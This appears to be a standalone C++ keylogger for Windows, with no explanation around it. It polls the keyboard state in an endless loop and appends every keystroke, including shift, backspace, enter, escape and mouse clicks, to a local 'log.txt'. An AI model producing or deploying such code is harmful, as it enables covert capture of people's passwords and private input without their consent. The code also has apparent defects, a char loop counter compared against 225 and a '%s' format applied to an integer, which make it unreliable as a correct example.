#include<iostream>
#include<Windows.h>

using namespace std;

int save(int x,char *file);

int main(){
    char i;
    while(true){
        for(i = 8; i <= 225; i++ ){
            if(GetAsyncKeyState(i) == -32767){
                save(i, "log.txt");
            }
        }
    }
    return 0;
}

int save(int x,char *file){

    cout<< x << endl;

    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen(file, "a+");
    if(x == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if(x == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACK]");
    else if(x == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
    else if(x == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
    else if(x == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else
    
	fprintf(OUTPUT_FILE, "%s", &x);
    
    fclose(OUTPUT_FILE);

    return 0;
}